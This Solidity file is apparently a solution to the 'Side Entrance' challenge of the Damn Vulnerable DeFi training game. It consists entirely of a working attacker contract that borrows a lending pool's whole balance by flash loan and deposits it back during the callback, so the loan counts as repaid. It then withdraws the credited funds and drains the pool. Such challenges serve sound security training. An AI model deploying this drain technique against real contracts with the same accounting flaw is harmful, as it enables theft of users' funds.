// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;
import "./SideEntranceLenderPool.sol";

/**
 *@title SideEntranceLenderPool - Attacker
 *@author Valentin Staykov - https://github.com/Bludya/damn-vulnerable-def-solutions
 */

 contract SideEntranceAttacker {
    function attack(SideEntranceLenderPool pool) external {
        uint256 amount = address(pool).balance;

        pool.flashLoan(amount);
        pool.withdraw();
    }

    function execute() external payable {
        SideEntranceLenderPool(msg.sender).deposit{value: msg.value}();
    }

    receive() external payable {}
 }